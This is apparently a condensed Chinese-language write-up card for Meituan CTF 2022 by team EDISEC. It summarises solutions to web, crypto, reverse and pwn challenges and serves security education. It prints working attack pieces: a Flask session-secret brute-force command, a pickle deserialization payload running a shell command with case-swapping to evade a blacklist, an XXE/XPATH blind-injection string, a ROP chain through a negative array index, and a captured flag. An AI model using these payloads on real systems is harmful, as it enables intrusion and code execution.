---
title: "第五届2022美团CTF-WriteUp By EDISEC"
category: web
tags: ["美团CTF", "web", "Web-Pickle反序列化", "Flask-Session伪造", "大小写绕", "Java-XXE"]
signals: ["美团CTF 2022", "Web-Pickle反序列化", "Flask-Session伪造", "大小写绕", "Java-XXE", "XPATH盲注", "Crypto-RSA", "魔改TEA", "Pwn-数组越界", "sqli", "Web", "Crypto", "Pwn", "easypickle"]
difficulty: medium
source: "https://www.ctfiot.com/57488.html"
tools: ["Flask", "Java", "gmpy2"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 第五届2022美团CTF-WriteUp By EDISEC

> 赛事：美团CTF 2022 | 方向：web | 难度：medium | 工具：Flask、Java、gmpy2

## 一句话总结

4道题Web/Crypto/Re/Pwn全覆盖:easypickle(flask-unsign+pickle大小写替换绕黑名单)+babyjava(XXE+XPATH substring逐位爆)+strange_rsa1(标准RSA)+re_1 small(魔改TEA delta=0x67452301)+note(libc-2.31数组越界+负idx写got)

## 攻击链

1. easypickle: flask-unsign爆破SECRET_KEY(os.urandom(2).hex仅16^4空间)→伪造session user=admin→构造pickle payload (cos system S''whoami'' os.)→大小写替换b"builtin"→b"BuIltIn"/b"os"→b"Os"/b"bytes"→b"Bytes"绕黑名单→base64编码session.ser_data|babyjava: XXE+XPATH盲注xpath=x'' or substring((/root/user[1]/username[2]),§10§,1)=''§T§'' and ''''=''|strange_rsa1: gmpy2.invert(e,s)解RSA p q e|re_1 small: 魔改TEA delta=0x67452301*35+|note: libc-2.31 PWN+数组越界

## 关键 payload

```
flask-unsign -u -c "eyJ1c2VyIjoibmlpbWQifQ.YyWuLQ.0cA5d6Yw0YLgq2_-ONSmWixQO0o" --wordlist /test/1.txt --no-literal-eval|b'''(cOs system S'whoami' Os.'''|xpath=x' or substring((/root/user[1]/username[2]),§10§,1)='§T§' and ''='|tt=[0xDE087143,0xC4F91BD2,0xDAF6DADC,0x6D9ED54C,0x75EB4EE7,0x5D1DDC04,0x511B0FD9,0x51DC88FB] key=[0x1,0x23,0x45,0x67] decrypt|edit(-4, p64(0) + p64(0x000000000040101a) + p64(pop_ret) + p64(binsh) + p64(sys))|flag{24af657f-a24a-4bf9-9b9c-a5c76dfd5e54}
```

## 经验教训

1) flask SECRET_KEY=os.urandom(2).hex()实际仅4字符16^4=65536空间,flask-unsign爆破秒出; 2) Pickle反序列化黑名单b'builtin'/'os'/'bytes'/'R'/'i'/'o'/'b'可通过大小写替换绕过(b'BuIltIn'→还原后等于'builtin'); 3) Java XXE+XPATH盲注 substring((/root/user[1]/username[2]),pos,1)='T' 逐位爆; 4) 魔改TEA delta可从0x9E3779B9改成其他值(如0x67452301),IDA反编译识别delta; 5) PWN数组越界用负idx(如edit(-4))写函数返回地址为ret+prdi+binsh+system

## 标签

Web-Pickle反序列化、Flask-Session伪造、大小写绕、Java-XXE、XPATH盲注、Crypto-RSA、魔改TEA、Pwn-数组越界

## 参考来源

- https://www.ctfiot.com/57488.html
- 原文件：第五届2022美团CTF-WriteUp_By_EDISEC.full.md
